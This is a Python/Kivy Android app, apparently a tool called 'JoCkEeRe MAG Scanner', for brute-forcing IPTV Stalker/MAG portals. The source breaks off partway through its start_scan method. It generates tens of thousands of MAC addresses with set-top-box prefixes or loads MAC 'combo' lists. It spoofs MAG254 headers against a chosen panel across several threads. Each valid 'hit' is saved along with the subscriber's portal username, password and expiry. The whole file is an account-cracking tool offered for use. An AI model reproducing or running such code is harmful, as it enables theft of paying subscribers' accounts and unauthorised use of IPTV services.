#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JoCkEeRe MAG Scanner - Version Ultra Enhanced UI
Design amélioré avec dégradés, animations et interface moderne
"""

import os
import re
import time
import random
import json
import queue
import threading
import hashlib
import logging
import platform
from datetime import date, datetime

# Configuration Kivy
from kivy.config import Config
Config.set('graphics', 'resizable', False)
Config.set('graphics', 'width', '450')
Config.set('graphics', 'height', '800')

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.spinner import Spinner
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.checkbox import CheckBox
from kivy.uix.filechooser import FileChooserListView
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
from kivy.uix.widget import Widget
from kivy.utils import platform as kivy_platform
from kivy.animation import Animation
from kivy.uix.progressbar import ProgressBar

Window.orientation = 'portrait'

# ==================== الألوان والثوابت ====================
COLORS = {
    'bg_dark':      (0.047, 0.055, 0.094, 1),      # #0C0E18
    'bg_card':      (0.078, 0.094, 0.157, 1),       # #141828
    'bg_card2':     (0.094, 0.114, 0.196, 1),       # #181D32
    'accent':       (0.0, 0.718, 0.937, 1),          # #00B7EF
    'accent2':      (0.549, 0.161, 1.0, 1),          # #8C29FF
    'accent3':      (1.0, 0.259, 0.506, 1),          # #FF4281
    'success':      (0.0, 0.898, 0.502, 1),          # #00E580
    'warning':      (1.0, 0.718, 0.0, 1),            # #FFB700
    'error':        (1.0, 0.271, 0.271, 1),          # #FF4545
    'text_primary': (0.937, 0.949, 1.0, 1),          # #EFF2FF
    'text_sec':     (0.549, 0.588, 0.745, 1),        # #8C96BE
    'white':        (1, 1, 1, 1),
    'transparent':  (0, 0, 0, 0),
}

# Bibliothèques réseau
import requests
import warnings
try:
    import cfscrape
    sesq = requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses = requests.Session()

warnings.filterwarnings('ignore')
logging.captureWarnings(True)

# ==================== Gestion des chemins pour Android ====================
is_android = kivy_platform == 'android'

if is_android:
    try:
        from android.permissions import request_permissions, Permission
        from android.storage import primary_external_storage_path
        request_permissions([
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.INTERNET
        ])
        BASE_DIR = primary_external_storage_path()
    except Exception as e:
        print(f"Android init error: {e}")
        BASE_DIR = "/sdcard"
else:
    BASE_DIR = "."

HITS_DIR = os.path.join(BASE_DIR, "Hits", "JoCkEeRe")
COMBO_DIR = os.path.join(BASE_DIR, "combo")
CONFIG_FILE = os.path.join(BASE_DIR, "Hits", "jockeere_config.json")

os.makedirs(HITS_DIR, exist_ok=True)
os.makedirs(COMBO_DIR, exist_ok=True)

nickn = "🕷 𝕁𝕠ℂ𝕜𝔼𝕖ℝ𝕖 🕷"

# ==================== Widgets personnalisés ====================

class CardBox(BoxLayout):
    """BoxLayout avec fond arrondi style carte"""
    def __init__(self, bg_color=None, radius=16, **kwargs):
        super().__init__(**kwargs)
        self._bg_color = bg_color or COLORS['bg_card']
        self._radius = radius
        with self.canvas.before:
            Color(*self._bg_color)
            self._rect = RoundedRectangle(size=self.size, pos=self.pos, radius=[self._radius])
        self.bind(size=self._update, pos=self._update)

    def _update(self, *args):
        self._rect.size = self.size
        self._rect.pos = self.pos


class GlowButton(Button):
    """Bouton avec effet glow moderne"""
    def __init__(self, glow_color=None, **kwargs):
        super().__init__(**kwargs)
        self._glow_color = glow_color or COLORS['accent']
        self.background_normal = ''
        self.background_down = ''
        self.background_color = (0, 0, 0, 0)
        self.color = COLORS['white']
        self.bold = True

        with self.canvas.before:
            # Ombre/glow
            Color(*self._glow_color[:3], 0.25)
            self._shadow = RoundedRectangle(
                size=(self.width + 6, self.height + 6),
                pos=(self.x - 3, self.y - 3),
                radius=[14]
            )
            # Fond principal
            Color(*self._glow_color)
            self._bg = RoundedRectangle(size=self.size, pos=self.pos, radius=[12])

        self.bind(size=self._update, pos=self._update)

    def _update(self, *args):
        self._bg.size = self.size
        self._bg.pos = self.pos
        self._shadow.size = (self.width + 6, self.height + 6)
        self._shadow.pos = (self.x - 3, self.y - 3)

    def on_press(self):
        anim = Animation(background_color=(0, 0, 0, 0.2), duration=0.1)
        anim.start(self)

    def on_release(self):
        anim = Animation(background_color=(0, 0, 0, 0), duration=0.1)
        anim.start(self)


class SectionHeader(BoxLayout):
    """En-tête de section avec ligne décorative"""
    def __init__(self, title, icon="◈", color=None, **kwargs):
        kwargs.setdefault('size_hint', (1, None))
        kwargs.setdefault('height', 44)
        super().__init__(orientation='horizontal', **kwargs)
        self._color = color or COLORS['accent']

        with self.canvas.before:
            # Ligne de gauche
            Color(*self._color)
            self._line = Rectangle(size=(4, self.height), pos=self.pos)
            # Fond semi-transparent
            Color(*self._color[:3], 0.08)
            self._bg = Rectangle(size=self.size, pos=self.pos)

        self.bind(size=self._upd, pos=self._upd)

        self.add_widget(Widget(size_hint_x=None, width=14))
        lbl = Label(
            text=f"[b]{icon}  {title}[/b]",
            markup=True,
            font_size='15sp',
            color=self._color,
            halign='left',
            valign='middle',
        )
        lbl.bind(size=lbl.setter('text_size'))
        self.add_widget(lbl)

    def _upd(self, *args):
        self._line.pos = self.pos
        self._line.size = (4, self.height)
        self._bg.size = self.size
        self._bg.pos = self.pos


class StyledInput(TextInput):
    """TextInput avec style moderne"""
    def __init__(self, **kwargs):
        kwargs.setdefault('background_color', COLORS['bg_card2'])
        kwargs.setdefault('foreground_color', COLORS['accent'])
        kwargs.setdefault('cursor_color', COLORS['accent'])
        kwargs.setdefault('hint_text_color', [*COLORS['text_sec'][:3], 0.6])
        kwargs.setdefault('font_size', '16sp')
        kwargs.setdefault('padding', [12, 10, 12, 10])
        super().__init__(**kwargs)
        with self.canvas.after:
            Color(*COLORS['accent'][:3], 0.4)
            self._border = Line(
                rounded_rectangle=[self.x, self.y, self.width, self.height, 8],
                width=1.2
            )
        self.bind(size=self._upd, pos=self._upd)

    def _upd(self, *args):
        self._border.rounded_rectangle = [self.x, self.y, self.width, self.height, 8]


class StyledSpinner(Spinner):
    """Spinner avec style moderne"""
    def __init__(self, **kwargs):
        kwargs.setdefault('background_color', COLORS['accent2'])
        kwargs.setdefault('color', COLORS['white'])
        kwargs.setdefault('font_size', '15sp')
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_down = ''


class StatBox(BoxLayout):
    """Widget de statistique avec valeur et label"""
    def __init__(self, label, value="0", color=None, **kwargs):
        kwargs.setdefault('orientation', 'vertical')
        super().__init__(**kwargs)
        self._color = color or COLORS['accent']

        with self.canvas.before:
            Color(*self._color[:3], 0.12)
            self._bg = RoundedRectangle(size=self.size, pos=self.pos, radius=[10])
            Color(*self._color[:3], 0.5)
            self._border = Line(
                rounded_rectangle=[*self.pos, *self.size, 10],
                width=1.2
            )
        self.bind(size=self._upd, pos=self._upd)

        self.val_lbl = Label(
            text=f"[b]{value}[/b]",
            markup=True,
            font_size='20sp',
            color=self._color,
        )
        self.title_lbl = Label(
            text=label,
            font_size='12sp',
            color=COLORS['text_sec'],
        )
        self.add_widget(self.val_lbl)
        self.add_widget(self.title_lbl)

    def _upd(self, *args):
        self._bg.size = self.size
        self._bg.pos = self.pos
        self._border.rounded_rectangle = [*self.pos, *self.size, 10]

    def set_value(self, val):
        self.val_lbl.text = f"[b]{val}[/b]"


# ==================== Fonctions auxiliaires ====================

def month_string_to_number(ay):
    m = {'jan':1,'feb':2,'mar':3,'apr':4,'may':5,'jun':6,
         'jul':7,'aug':8,'sep':9,'oct':10,'nov':11,'dec':12}
    return m.get(ay.strip()[:3].lower(), 1)


def tarih_clear(trh):
    try:
        ay = trh.split(' ')[0]
        gun = trh.split(', ')[0].split(' ')[1]
        yil = trh.split(',')[1]
        ay = month_string_to_number(ay)
        d = date(int(yil), int(ay), int(gun))
        sontrh = time.mktime(d.timetuple())
        return int((sontrh - time.time()) / 86400)
    except:
        return 0


def vpnip(ip):
    url = f"http://ip-api.com/json/{ip}?fields=status,country,city"
    try:
        res = ses.get(url, timeout=7, verify=False).json()
        if res.get("status") == "success":
            return f"{res.get('country', 'Unknown')}/{res.get('city', 'Unknown')}"
    except:
        pass
    return "𝐈𝐧𝐯𝐚𝐥𝐢𝐝"


def randommac(prefix):
    genmac = f"{prefix}%02X:%02X:%02X" % (
        random.randint(0, 256), random.randint(0, 256), random.randint(0, 256)
    )
    genmac = genmac.replace(':100', ':10')
    return genmac


def hea1(macs, useragent, panel):
    return {
        "User-Agent": useragent,
        "Referer": f"http://{panel}/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }


def hea2(macs, token, useragent, panel):
    return {
        "User-Agent": useragent,
        "Referer": f"http://{panel}/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": f"Bearer {token}",
    }


def hea3(panel):
    return {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }


def goruntu(link, panel):
    try:
        res = ses.get(link, headers=hea3(panel), timeout=(2, 5),
                      allow_redirects=False, stream=True)
        if res.status_code == 302:
            return "🆅🅰🆅 ✅😎"
        else:
            return "𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒⛔"
    except:
        return "𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒⛔"


def list_categories(listlink, macs, token, useragent, panel, livel):
    kategori = ""
    veri = ""
    for _ in range(12):
        try:
            res = ses.get(listlink, headers=hea2(macs, token, useragent, panel),
                          timeout=30, verify=False)
            veri = str(res.text)
            break
        except:
            time.sleep(1)
    if veri.count('title":"') > 1:
        for i in veri.split('title":"')[1:]:
            try:
                kanal = str(
                    (i.split('"')[0]).encode('utf-8').decode("unicode-escape")
                ).replace('\\/', '/')
                kanal = kanal.lstrip('{')
                kategori += kanal + livel
            except:
                pass
    return kategori


def m3uapi(playerlink, macs, token, useragent, panel):
    mt = ""
    veri = ""
    for _ in range(6):
        try:
            res = ses.get(playerlink, headers=hea2(macs, token, useragent, panel),
                          timeout=7, verify=False)
            veri = str(res.text)
            break
        except:
            time.sleep(1)
    try:
        if 'active_cons' in veri:
            acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
            mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
            status = veri.split('status":')[1].split(',')[0].replace('"', '')
            timezone = veri.split('timezone":"')[1].split('",')[0].replace("\\/", "/").rstrip('"}')
            port = veri.split('port":')[1].split(',')[0].replace('"', '')
            userm = veri.split('username":')[1].split(',')[0].replace('"', '')
            pasm = veri.split('password":')[1].split(',')[0].replace('"', '')
            bitism = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
            if bitism == "null":
                bitism = "Unlimited"
            else:
                bitism = datetime.fromtimestamp(int(bitism)).strftime('%m-%d-%Y')
            mt = (f"\n╔═🌟 {nickn}\n╠═📡𝐏𝐎𝐑𝐓 ➤ {port}\n╠═👨🏻‍🦱𝐔𝐒𝐄𝐑 ➤ {userm}"
                  f"\n╠═🔑𝐏𝐀𝐒𝐒 ➤ {pasm}\n╠═✅𝐀𝐜𝐭𝐂𝐨𝐧 ➤ {acon}\n╠═👨‍👨‍👦‍👦𝐌𝐚𝐱𝐂𝐨𝐧 ➤ {mcon}"
                  f"\n╠═🚦𝐒𝐓𝐀𝐓𝐔𝐒 ➤ {status}\n╠═⏰𝐓𝐢𝐦𝐞𝐙𝐨𝐧𝐞 ➤ {timezone}"
                  f"\n╚═💫✰✰𝑴𝑶𝑫 𝑩𝒚 𝕁𝕠ℂ𝕜𝔼𝕖ℝ𝕖✰✰")
    except:
        pass
    return mt


def url_gen(cid, panel, uzmanm):
    return (f"http://{panel}/{uzmanm}?type=itv&action=create_link"
            f"&cmd=ffmpeg%20http://localhost/ch/{cid}_&series=&forced_storage=0"
            f"&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml")


def save_hit_to_file(hit_text, panel):
    safe_panel = panel.replace(':', '_').replace('/', '_')
    fname = f"{safe_panel}.txt"
    path = os.path.join(HITS_DIR, fname)
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(hit_text + "\n\n")
    except Exception as e:
        print(f"Error saving hit: {e}")


def extract_hit_info(hit_text):
    panel_match = re.search(r"╠❖ 𝑷𝒂𝒏𝒆𝒍: (.*?)\n", hit_text)
    mac_match = re.search(r"╠❖ 𝑴𝒂𝒄: (.*?)\n", hit_text)
    expiry_match = re.search(r"╠❖ 𝑬𝒙𝒑𝒊𝒓𝒚: (.*?)\n", hit_text)
    panel_str = panel_match.group(1).strip() if panel_match else "N/A"
    mac_str = mac_match.group(1).strip() if mac_match else "N/A"
    expiry_str = expiry_match.group(1).strip() if expiry_match else "N/A"
    return (f"╔══════ ✅ HIT FOUND ══════╗\n"
            f"  Panel  : {panel_str}\n"
            f"  Mac    : {mac_str}\n"
            f"  Expiry : {expiry_str}\n"
            f"╚══════════════════════════╝")


# ==================== Interface principale ====================

class JoCkEeReApp(App):
    def build(self):
        self.title = "JoCkEeRe Ultra Scanner"
        Window.clearcolor = COLORS['bg_dark']
        return ScannerLayout()


class ScannerLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', padding=[10, 8, 10, 8], spacing=8, **kwargs)

        # Variables d'état
        self.running = False
        self.paused = False
        self.stop_event = threading.Event()
        self.pause_event = threading.Event()
        self.update_queue = queue.Queue()
        self.worker_threads = []
        self.mac_list = []
        self.hits = 0
        self.checked = 0
        self.start_time = 0
        self.total_macs = 0
        self.combo_path = None
        self.panel_host = ""
        self.panel_choice = ""
        self.mac_prefix = ""
        self.bots = 4
        self.output_mode = "0"
        self.dsyno = "0"
        self.useragent = ""
        self.uzmanm = ""
        self.uzmanc = ""
        self.buri = ""
        self.urib = ""
        self.uzmanm2 = ""

        # Fond principal
        with self.canvas.before:
            Color(*COLORS['bg_dark'])
            self.rect = Rectangle(size=self.size, pos=self.pos)
        self.bind(size=self._update_rect, pos=self._update_rect)

        self._build_header()
        self._build_scroll_area()
        self._build_stats_bar()
        self._build_log_area()
        self._build_controls()
        self._build_status_bar()

        Clock.schedule_interval(self.process_queue, 0.08)
        self.load_settings()

    def _update_rect(self, *args):
        self.rect.size = self.size
        self.rect.pos = self.pos

    # ============ Header ============
    def _build_header(self):
        header = CardBox(
            bg_color=COLORS['bg_card'],
            radius=0,
            size_hint=(1, None),
            height=72,
            orientation='horizontal',
            padding=[14, 8, 14, 8],
        )
        # Logo / titre
        title_box = BoxLayout(orientation='vertical')
        title_lbl = Label(
            text="[b]🕷 JoCkEeRe[/b]",
            markup=True,
            font_size='22sp',
            color=COLORS['accent'],
            halign='left',
            size_hint_y=0.6,
        )
        title_lbl.bind(size=title_lbl.setter('text_size'))
        sub_lbl = Label(
            text="MAG Ultra Scanner",
            font_size='12sp',
            color=COLORS['text_sec'],
            halign='left',
            size_hint_y=0.4,
        )
        sub_lbl.bind(size=sub_lbl.setter('text_size'))
        title_box.add_widget(title_lbl)
        title_box.add_widget(sub_lbl)
        header.add_widget(title_box)

        # Badge version
        badge = CardBox(
            bg_color=(*COLORS['accent2'][:3], 0.25),
            radius=10,
            size_hint=(None, None),
            width=70,
            height=36,
            orientation='vertical',
        )
        badge.add_widget(Label(
            text="[b]v2.0[/b]",
            markup=True,
            font_size='13sp',
            color=COLORS['accent2'],
        ))
        header.add_widget(badge)

        # Décoration
        with header.canvas.after:
            Color(*COLORS['accent'][:3], 0.6)
            Rectangle(size=(header.width, 2), pos=(header.x, header.y))

        self.add_widget(header)

    # ============ Zone scrollable (settings) ============
    def _build_scroll_area(self):
        scroll = ScrollView(
            size_hint=(1, None),
            height=360,
            bar_color=(*COLORS['accent'][:3], 0.5),
            bar_inactive_color=(*COLORS['accent'][:3], 0.2),
            bar_width=4,
        )
        inner = BoxLayout(
            orientation='vertical',
            size_hint_y=None,
            spacing=10,
            padding=[0, 4, 0, 4],
        )
        inner.bind(minimum_height=inner.setter('height'))

        # --- Panel Settings ---
        inner.add_widget(SectionHeader("PANEL SETTINGS", "⚙", COLORS['accent']))

        panel_card = CardBox(
            bg_color=COLORS['bg_card'],
            radius=12,
            orientation='vertical',
            size_hint=(1, None),
            height=130,
            padding=[12, 10, 12, 10],
            spacing=10,
        )

        # Type
        row1 = BoxLayout(size_hint=(1, None), height=46, spacing=8)
        row1.add_widget(Label(
            text="Type:",
            font_size='14sp',
            color=COLORS['text_sec'],
            size_hint_x=0.22,
            halign='right',
        ))
        self.panel_type_spinner = StyledSpinner(
            text='1 - Portal.php',
            values=[
                "1 - Portal.php", "2 - Portal.php (White Ultra)", "3 - Portal.php (Real Blue)",
                "4 - Server/load.php", "5 - Stalker_portal", "6 - C/server/load.php",
                "7 - C/portal.php", "8 - Bs.msg.portal", "9 - Magload.php",
                "10 - Portalstb/portal.php", "11 - K/portal.php (comet)", "12 - Maglove/portal.php",
                "13 - Magaccess", "14 - Portalmega.php", "15 - Powerfull"
            ],
            size_hint_x=0.78,
            height=46,
            size_hint_y=None,
        )
        row1.add_widget(self.panel_type_spinner)

        # Host
        row2 = BoxLayout(size_hint=(1, None), height=46, spacing=8)
        row2.add_widget(Label(
            text="Host:",
            font_size='14sp',
            color=COLORS['text_sec'],
            size_hint_x=0.22,
            halign='right',
        ))
        self.panel_entry = StyledInput(
            hint_text="panel.example.com:8080",
            multiline=False,
            size_hint_x=0.78,
        )
        row2.add_widget(self.panel_entry)

        panel_card.add_widget(row1)
        panel_card.add_widget(row2)
        inner.add_widget(panel_card)

        # --- MAC Source ---
        inner.add_widget(SectionHeader("MAC SOURCE", "◉", COLORS['accent2']))

        mac_card = CardBox(
            bg_color=COLORS['bg_card'],
            radius=12,
            orientation='vertical',
            size_hint=(1, None),
            height=170,
            padding=[12, 10, 12, 10],
            spacing=10,
        )

        # Toggle
        toggle_row = BoxLayout(size_hint=(1, None), height=40, spacing=6)
        self.random_cb = CheckBox(active=True, size_hint_x=None, width=30,
                                   color=COLORS['accent'])
        toggle_row.add_widget(self.random_cb)
        toggle_row.add_widget(Label(text="Random", font_size='15sp',
                                     color=COLORS['text_primary'], size_hint_x=0.3))
        self.combo_cb = CheckBox(active=False, size_hint_x=None, width=30,
                                  color=COLORS['accent2'])
        toggle_row.add_widget(self.combo_cb)
        toggle_row.add_widget(Label(text="Combo File", font_size='15sp',
                                     color=COLORS['text_primary'], size_hint_x=0.3))
        self.random_cb.bind(active=self.on_random_toggle)
        self.combo_cb.bind(active=self.on_combo_toggle)
        mac_card.add_widget(toggle_row)

        # Random row
        self.random_row = BoxLayout(size_hint=(1, None), height=46, spacing=8)
        self.random_row.add_widget(Label(text="Prefix:", font_size='14sp',
                                          color=COLORS['text_sec'], size_hint_x=0.22))
        self.prefix_spinner = StyledSpinner(
            text='00:1A:79:',
            values=['D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:',
                    '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:', '1A:00:FB:',
                    '00:A1:79:', '00:1B:79:', '00:2A:79:', '00:1A:79:'],
            size_hint_x=0.4,
            background_color=COLORS['bg_card2'],
        )
        self.random_row.add_widget(self.prefix_spinner)
        self.random_row.add_widget(Label(text="Count:", font_size='14sp',
                                          color=COLORS['text_sec'], size_hint_x=0.15))
        self.mac_count_input = StyledInput(
            text="30000", multiline=False, input_filter='int',
            size_hint_x=0.23,
        )
        self.random_row.add_widget(self.mac_count_input)
        mac_card.add_widget(self.random_row)

        # Combo row
        self.combo_row = BoxLayout(size_hint=(1, None), height=46, spacing=8, opacity=0)
        self.combo_file_label = Label(
            text="No file selected",
            font_size='13sp',
            color=COLORS['text_sec'],
            halign='left',
        )
        self.combo_file_label.bind(size=self.combo_file_label.setter('text_size'))
        browse_btn = GlowButton(
            text="📂 Browse",
            font_size='14sp',
            glow_color=COLORS['accent2'],
            size_hint_x=None,
            width=110,
        )
        browse_btn.bind(on_press=self.browse_combo)
        self.combo_row.add_widget(self.combo_file_label)
        self.combo_row.add_widget(browse_btn)
        mac_card.add_widget(self.combo_row)

        inner.add_widget(mac_card)

        # --- Scan Settings ---
        inner.add_widget(SectionHeader("SCAN SETTINGS", "⚡", COLORS['warning']))

        scan_card = CardBox(
            bg_color=COLORS['bg_card'],
            radius=12,
            orientation='horizontal',
            size_hint=(1, None),
            height=70,
            padding=[12, 10, 12, 10],
            spacing=10,
        )
        scan_card.add_widget(Label(text="Bots:", font_size='14sp',
                                    color=COLORS['text_sec'], size_hint_x=0.14))
        self.bots_input = StyledInput(
            text="4", multiline=False, input_filter='int',
            size_hint_x=0.12,
        )
        scan_card.add_widget(self.bots_input)
        scan_card.add_widget(Label(text="Output:", font_size='14sp',
                                    color=COLORS['text_sec'], size_hint_x=0.18))
        self.output_spinner = StyledSpinner(
            text="0-Login Only",
            values=["0-Login Only", "1-Live Only", "2-Everything"],
            size_hint_x=0.56,
            background_color=COLORS['warning'],
        )
        self.output_spinner.color = (0.1, 0.1, 0.1, 1)
        scan_card.add_widget(self.output_spinner)
        inner.add_widget(scan_card)

        scroll.add_widget(inner)
        self.add_widget(scroll)

    # ============ Stats Bar ============
    def _build_stats_bar(self):
        stats = BoxLayout(
            size_hint=(1, None),
            height=80,
            spacing=8,
            padding=[0, 4, 0, 4],
        )

        self.hits_stat = StatBox("HITS", "0", COLORS['success'],
                                  size_hint_x=0.28)
        self.checked_stat = StatBox("CHECKED", "0", COLORS['accent'],
                                     size_hint_x=0.36)
        self.progress_stat = StatBox("PROGRESS", "0%", COLORS['accent2'],
                                      size_hint_x=0.36)

        stats.add_widget(self.hits_stat)
        stats.add_widget(self.checked_stat)
        stats.add_widget(self.progress_stat)
        self.add_widget(stats)

        # MAC en cours
        mac_row = BoxLayout(size_hint=(1, None), height=30, spacing=6)
        mac_row.add_widget(Label(
            text="⟳",
            font_size='14sp',
            color=COLORS['accent'],
            size_hint_x=None,
            width=20,
        ))
        self.current_mac_label = Label(
            text="Waiting...",
            font_size='13sp',
            color=COLORS['text_sec'],
            halign='left',
        )
        self.current_mac_label.bind(size=self.current_mac_label.setter('text_size'))
        mac_row.add_widget(self.current_mac_label)
        self.add_widget(mac_row)

    # ============ Log Area ============
    def _build_log_area(self):
        log_card = CardBox(
            bg_color=(*COLORS['bg_card'][:3], 0.8),
            radius=12,
            orientation='vertical',
            size_hint=(1, 1),
            padding=[6, 6, 6, 6],
        )

        log_header = BoxLayout(size_hint=(1, None), height=28, spacing=6)
        log_header.add_widget(Label(
            text="[b]📋 SCAN LOG[/b]",
            markup=True,
            font_size='13sp',
            color=COLORS['accent'],
            halign='left',
            size_hint_x=0.5,
        ))
        self.log_count_lbl = Label(
            text="Lines: 0",
            font_size='12sp',
            color=COLORS['text_sec'],
            halign='right',
            size_hint_x=0.5,
        )
        log_header.add_widget(self.log_count_lbl)
        log_card.add_widget(log_header)

        scroll = ScrollView(bar_color=(*COLORS['accent'][:3], 0.5),
                             bar_width=3)
        self.log_text = TextInput(
            text="",
            readonly=True,
            multiline=True,
            background_color=(0.047, 0.055, 0.094, 1),
            foreground_color=COLORS['text_primary'],
            font_size='13sp',
            size_hint_y=None,
            font_name='RobotoMono',
        )
        self.log_text.bind(minimum_height=self.log_text.setter('height'))
        scroll.add_widget(self.log_text)
        log_card.add_widget(scroll)
        self.add_widget(log_card)

    # ============ Contrôles ============
    def _build_controls(self):
        btn_row = BoxLayout(size_hint=(1, None), height=58, spacing=10, padding=[0, 4, 0, 4])

        self.start_btn = GlowButton(
            text="▶  START",
            font_size='16sp',
            glow_color=COLORS['success'],
        )
        self.pause_btn = GlowButton(
            text="⏸  PAUSE",
            font_size='16sp',
            glow_color=COLORS['warning'],
        )
        self.pause_btn.disabled = True
        self.clear_btn = GlowButton(
            text="🗑  CLEAR",
            font_size='16sp',
            glow_color=COLORS['accent'],
        )

        self.start_btn.bind(on_press=self.toggle_scan)
        self.pause_btn.bind(on_press=self.toggle_pause)
        self.clear_btn.bind(on_press=self.clear_log)

        btn_row.add_widget(self.start_btn)
        btn_row.add_widget(self.pause_btn)
        btn_row.add_widget(self.clear_btn)
        self.add_widget(btn_row)

    # ============ Barre de statut ============
    def _build_status_bar(self):
        status = BoxLayout(size_hint=(1, None), height=36, padding=[4, 4, 4, 4])
        with status.canvas.before:
            Color(*COLORS['bg_card'])
            status._bg = Rectangle(size=status.size, pos=status.pos)
        status.bind(size=lambda i, v: setattr(i._bg, 'size', v),
                    pos=lambda i, v: setattr(i._bg, 'pos', v))

        self.status_label = Label(
            text="● Ready",
            font_size='13sp',
            color=COLORS['success'],
            halign='left',
            size_hint_x=0.5,
        )
        self.status_label.bind(size=self.status_label.setter('text_size'))
        self.time_label = Label(
            text="⏱ 00:00:00",
            font_size='13sp',
            color=COLORS['text_sec'],
            halign='right',
            size_hint_x=0.5,
        )
        self.time_label.bind(size=self.time_label.setter('text_size'))
        status.add_widget(self.status_label)
        status.add_widget(self.time_label)
        self.add_widget(status)

    # ==================== Logique UI ====================

    def on_random_toggle(self, instance, value):
        if value:
            self.combo_cb.active = False
            self.random_row.opacity = 1
            self.combo_row.opacity = 0
            self.dsyno = "0"

    def on_combo_toggle(self, instance, value):
        if value:
            self.random_cb.active = False
            self.random_row.opacity = 0
            self.combo_row.opacity = 1
            self.dsyno = "1"

    def browse_combo(self, instance):
        start_path = COMBO_DIR if os.path.exists(COMBO_DIR) else BASE_DIR
        content = BoxLayout(orientation='vertical', spacing=8, padding=10)
        filechooser = FileChooserListView(path=start_path, filters=['*.txt'])
        select_btn = GlowButton(
            text="✔ Select File",
            font_size='16sp',
            glow_color=COLORS['success'],
            size_hint=(1, None),
            height=52,
        )
        content.add_widget(filechooser)
        content.add_widget(select_btn)
        popup = Popup(
            title="📂 Choose Combo File",
            title_color=COLORS['accent'],
            content=content,
            size_hint=(0.9, 0.88),
            background_color=COLORS['bg_card'],
            separator_color=COLORS['accent'],
        )

        def on_select(btn):
            if filechooser.selection:
                self.combo_path = filechooser.selection[0]
                self.combo_file_label.text = os.path.basename(self.combo_path)
                try:
                    with open(self.combo_path, 'r', encoding='utf-8', errors='ignore') as f:
                        raw = f.readlines()
                    self.mac_list = []
                    pattern = r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}"
                    for line in raw:
                        m = re.search(pattern, line.upper())
                        if m:
                            self.mac_list.append(m.group())
                    self.add_log(f"✅ Loaded {len(self.mac_list)} MACs from file")
                except Exception as e:
                    self.add_log(f"❌ Error: {e}", error=True)
                    self.mac_list = []
            popup.dismiss()

        select_btn.bind(on_press=on_select)
        popup.open()

    def clear_log(self, instance):
        self.log_text.text = ""
        self.log_count_lbl.text = "Lines: 0"

    def add_log(self, msg, error=False, hit=False):
        ts = time.strftime('%H:%M:%S')
        if hit:
            prefix = f"[{ts}] "
        elif error:
            prefix = f"[{ts}] ⚠ "
        else:
            prefix = f"[{ts}] "
        self.log_text.text += prefix + msg + "\n"
        lines = len(self.log_text.text.splitlines())
        self.log_count_lbl.text = f"Lines: {lines}"

    def load_settings(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    s = json.load(f)
                self.panel_entry.text = s.get("panel_host", "")
                idx = s.get("panel_type", 0)
                self.panel_type_spinner.text = self.panel_type_spinner.values[idx]
                self.prefix_spinner.text = s.get("mac_prefix", "00:1A:79:")
                self.mac_count_input.text = str(s.get("total_macs", "30000"))
                self.bots_input.text = str(s.get("bots", "4"))
                out_idx = s.get("output_mode", 0)
                self.output_spinner.text = self.output_spinner.values[out_idx]
            except:
                pass

    def save_settings(self):
        try:
            settings = {
                "panel_host": self.panel_entry.text,
                "panel_type": self.panel_type_spinner.values.index(self.panel_type_spinner.text),
                "mac_prefix": self.prefix_spinner.text,
                "total_macs": self.mac_count_input.text,
                "bots": self.bots_input.text,
                "output_mode": self.output_spinner.values.index(self.output_spinner.text)
            }
            with open(CONFIG_FILE, 'w') as f:
                json.dump(settings, f)
        except:
            pass

    def toggle_scan(self, instance):
        if self.running:
            self.stop_scan()
        else:
            self.start_scan()

    def stop_scan(self):
        self.running = False
        self.stop_event.set()
        self.pause_event.set()
        self.start_btn.text = "▶  START"
        self.start_btn._glow_color = COLORS['success']
        self.pause_btn.disabled = True
        self.status_label.text = "● Stopped"
        self.status_label.color = COLORS['error']
        self.add_log("Scan stopped", error=True)
        self.current_mac_label.text = "Waiting..."

    def toggle_pause(self, instance):
        if not self.running:
            return
        if self.paused:
            self.pause_event.set()
            self.paused = False
            self.pause_btn.text = "⏸  PAUSE"
            self.status_label.text = "● Scanning..."
            self.status_label.color = COLORS['success']
            self.add_log("▶ Resumed")
        else:
            self.pause_event.clear()
            self.paused = True
            self.pause_btn.text = "▶  RESUME"
            self.status_label.text = "⏸ Paused"
            self.status_label.color = COLORS['warning']
            self.add_log("⏸ Paused", error=True)

    def start_scan(self):
        self.panel_host = self.panel_entry.text.strip()
        if not self.panel_host:
